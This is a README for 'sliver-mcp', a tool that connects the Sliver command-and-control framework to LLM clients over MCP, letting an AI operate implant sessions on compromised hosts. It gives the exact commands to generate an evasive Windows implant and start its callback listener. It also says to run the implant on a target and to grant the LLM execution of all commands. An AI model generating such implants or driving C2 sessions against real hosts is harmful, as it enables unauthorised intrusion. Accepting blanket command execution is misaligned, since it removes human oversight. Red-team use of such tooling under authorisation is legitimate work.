# sliver-mcp

Sliver-MCP is a both MCP server for Sliver Server. It was tested on v1.5.42.

## Compiling from source
```
go build -v .
```

## Usage
1. Enable multiplayer option in Sliver: `sliver > multiplayer`
2. Generate config for MCP server: `sliver > new-operator --name mcp --save /path/to/config/mcp-sliver.cfg --lhost 192.168.3.4`
3. Connect to running remote MCP server via HTTP in LM Studio/Claude desktop/any other LLM client which supports MCP servers. Enable it after connecting and allow execution of all commands. Example JSON config:
```
"sliver_mcp": {
    "command": "/path/to/compiled/binary",
    "args": [
        "-operator-config",
        "/path/to/sliver/multiplayer.cfg",
        "-lhost",
        "0.0.0.0",
        "-lport",
        "11337"
    ]
}
```
4. Generate payload and start listener.
```
sliver > generate --http 192.168.1.2:34443 --evasion --os windows --format exe
sliver > http --lhost 192.168.3.4 --lport 34443
```
5. Transfer implant to the target host and execute it.
6. Ask LLM to do (almost) anything, like, `show sessions, pick the first one, cd to root, run ls and then change name of the current session to pwnz_by_ai`.

---

## TODO: 
- stdio support
- 
- sending/retrieving tasks for beacons in async fashion 

## skipped features:
- Armory, crackstations, cursed, shell, websites,  windows-specific features (execute assembly/shellcode/sideload), and some other features (fs: upload/download/cat, loot, screenshot, generating payloads). Either I was too lazy to tinker with these, or they are just not well suited for interaction via LLM.
- Most beacon async commands and features, related to beacons. At the current stage, this PoC focuses on interactions with interactive sessions only.
- Portfwd, reverse portfwd, socks. I hadn't much luck with them, looks like per v1.5.42, these don't always behave as expected.

## Reference links
https://sliver.sh/docs?name=Custom%20Clients
